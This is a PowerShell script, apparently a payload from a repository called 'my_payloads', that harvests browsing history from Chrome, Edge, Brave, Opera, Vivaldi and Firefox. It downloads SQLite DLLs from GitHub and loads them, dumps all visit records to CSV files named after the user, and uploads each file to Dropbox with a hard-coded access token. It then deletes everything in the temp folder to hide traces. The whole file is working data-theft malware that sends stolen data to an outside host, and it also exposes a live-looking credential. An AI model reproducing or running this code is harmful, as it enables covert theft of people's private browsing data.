# Define browser paths
$BrowserHistoryPaths = @{
    "Google_Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    "Microsoft_Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Brave"          = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Opera"          = "$env:APPDATA\Opera Software\Opera Stable\History"
    "Vivaldi"        = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"
}

# Find firefox history
$FirefoxProfilesPath =  "$env:APPDATA\Mozilla\Firefox\Profiles"

if(Test-Path $FirefoxProfilesPath -PathType Container){
    $Profiles = Get-ChildItem -Path $FirefoxProfilesPath -Directory -Force

    foreach($profile in $Profiles){

        $FirefoxHistorydb = "$FirefoxProfilesPath\$($profile.Name)\places.sqlite"

        if(Test-Path $FirefoxHistorydb -PathType Leaf){
            $BrowserHistoryPaths["Firefox"] = $FirefoxHistorydb
            break
        }
    }
}

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath -ErrorAction Stop

# Function to clean up temporary files
function Cleanup-TempFiles {
    param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [string]$TempDB
    )
    if (Test-Path $TempDB) {
        Remove-Item -Path $TempDB -Force -ErrorAction SilentlyContinue
    }
}

function DropBox-Upload {

    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 

    $DropBoxAccessToken = "sl.u.AFoYRbenuna96IsAifS8a0ebmxuiJx5yhta6Jo1uXb5j6Z6-myXxnIuafInDIpa0Ip0_ftYbYIXFE71FtnWub6oIiBA8_gEc7RF1Z70fmwEGWsX99FP8rpkl2CqBrPK8Pu7W6qiMnS7Sfl3OdpTcWu0mbb1SvYFrEp7CxSknmCiytF0aBSoamLkK7N2j3kS_MPLbCxzmWNGcca_w8OVgzABAxwWh8jlgpMFwIiDxZEXauEgoRFlyw50j1ZGs-dvVvURNh7Tzw8EcO2SgKYSaPbpwpQJJ2x8EaHfheUtn0Utl1IG60bygZY36gqpaCJ2GRrdB2HJ9vPRjza3cWSV8ewCVQ1fKxc2X5NUHjL97dqhmwgYRLGnGuSqykovMBovlFcsHWY7Jx9SBQ-Jz00IMMtZRlttW9ZMZqJTyLzOHwMcNjyzYwD2JPB5ruciUNa091gzqYrFpIvxviuweYVj86NMRlzT_YwHaRn9kEA9bxlYXM0s6wQwl67u1Mt4wo_ZcoCqbzGeEf4Sw9zQwysSlsdx0NDknz-ZrkcQL6MHeHPPPJ6UWUIiM4YkZswKNTfRhXUO0p3XX8KEs146RkSqlrOJuMRrtP8uvmnVI96MNeIyeBUVtZINU4hPt71y9SJKWMG7qhEz9ceywOgDvG7hn43CHqOu5j5Z6UqPETCRzNA8mhHenf2XJhLfgeYam0fighINhjZudqUiZ2ogBOm888lTH9XwBpFZynw9Qt5bRtUNvr0v5W3Yuqs3MO-U8Gv8hehbaYHjfV80k_VV7BTUol-4XP3Qfv-vAemGokYmamk90_biU4ZsqCC-mtEZ2AtOzzBlyiZ6UqAirwR1YDxKLAOPzgJxSsmzQRifsbfT8MEr7whyBKC4FLc0GzB6CTSC9AKUhvwy35P5GNGX0uZ2N0bEuRjRFK3bJwut566V7nfpcb4qgKIUDmDLlqhEPO1qm2LSa4hRFIFUsm8bnljtvfRuSj1Ozku2zJHi7I0GBickBf7yr4WA2C-4pdI8rvAjStLzIq5UiAM5CgXKiU06Cu-YdB5DjixRuo8_1RfoLGWLFAX3YYNCpzwjIqBthHbPaTUL953hYUsrVwlyPPMQ6LkxwtaBu4qo9bHKKs5UG2HdeLnysbF1zy44O7pKVTPHfdhL2yNqmGIdct5GFBNqMoojyFAFgR1EV0MBJ2mxhCqNYNri3zv3Jcve8D0wfhzpUg0uFAqbJcmr7Jkq43lRuqKAgbEQHLhXdVlNoaNzGl6tuzhq9xWWIzUixo61lpYm3NPb5Xv4i6wX6FKmSSqaQa9aIqPiEZKMKNTPAwu-FuZiQKeLJ1J2plz0iFxVhL5BMPfMCoBjW306t5ZYWFXbod1oti7XhEwsZQUzr70xdXSmSY40jDLKVyqUnXLolWKSe5rYBMpGt0Y2U-LAHfx7rZ1qT"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Iterate through detected browsers
foreach ($Browser in $BrowserHistoryPaths.Keys) {
    $HistoryDB = $BrowserHistoryPaths[$Browser]

    if (Test-Path $HistoryDB) {
        try {
            # Create a temporary copy to avoid file lock issues
            $TempDB = "$env:TEMP\${Browser}_History.db"
            Copy-Item -Path $HistoryDB -Destination $TempDB -Force

            # Define SQLite query
            if ($Browser -eq "Firefox") {
                # Firefox stores history in "moz_places" table
                # $Query = "SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') AS last_visited FROM moz_places INNER JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC"
                $Query = "SELECT moz_places.*, moz_historyvisits.*, datetime(moz_historyvisits.visit_date / 1000000, 'unixepoch', 'localtime') AS visit_date, datetime(moz_places.last_visit_date / 1000000, 'unixepoch', 'localtime') AS last_visit_date FROM moz_places FULL OUTER JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC"
                # $Query = "SELECT * FROM moz_places LEFT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id UNION SELECT * FROM moz_places RIGHT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC"
            } else {
                # Chromium-based browsers
                # $Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"
                $Query = "SELECT urls.url as url_string, urls.*, visits.url as url_id, visits.*, datetime(visits.visit_time/1000000 - 11644473600, 'unixepoch', 'localtime') AS visit_time, datetime(urls.last_visit_time/1000000 - 11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls FULL OUTER JOIN visits ON urls.id = visits.id ORDER BY visits.visit_time DESC"
                # $Query = "SELECT * FROM urls LEFT JOIN visits ON urls.id = visits.id UNION SELECT * FROM urls RIGHT JOIN visits ON urls.id = visits.id ORDER BY visits.visit_time DESC"
            }

            # Connect to SQLite database
            $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
            $Connection.Open()

            # Execute query
            $Command = $Connection.CreateCommand()
            $Command.CommandText = $Query
            $Reader = $Command.ExecuteReader()

            # Store history
            $History = @()
            while ($Reader.Read()) {
                # Create an empty hash table to hold column data
                $columnData = @{}
            
                # Iterate over all columns and dynamically add them to the hash table
                for ($i = 0; $i -lt $Reader.FieldCount; $i++) {
                    $columnName = $Reader.GetName($i)
                    $columnValue = $Reader.GetValue($i)
                    
                    # Add each column to the hash table with the column name as the key
                    $columnData[$columnName] = $columnValue
                }
            
                # Add the browser information to the hash table and create the custom object
                $columnData["Browser"] = $Browser
            
                # Add the hash table as a custom object
                $History += New-Object PSObject -Property $columnData
            }

            # Close connection properly
            $Reader.Close()
            $Command.Dispose()
            $Connection.Close()
            $Connection.Dispose()

            Start-Sleep -Milliseconds 500

            # show output history
	        # Write-Output "Browsing History from ${Browser}:"
	        # $History | Format-Table -AutoSize

            # Save history to CSV
            $CsvPath = "$env:TEMP\$env:USERNAME-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-$Browser-History.csv"
            $History | Export-Csv -Path $CsvPath -NoTypeInformation

            # Output result
            Write-Output "History saved: $CsvPath"

            $CsvPath | DropBox-Upload
        }
        catch {
            Write-Error "An error occurred while processing ${Browser}: $_"
        }
        finally {
            Cleanup-TempFiles -TempDB $TempDB
        }
    }
    else{
    	Write-Output "The ${Browser} history file has not been found."
    }
}

Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -ErrorAction SilentlyContinue" -NoNewWindow
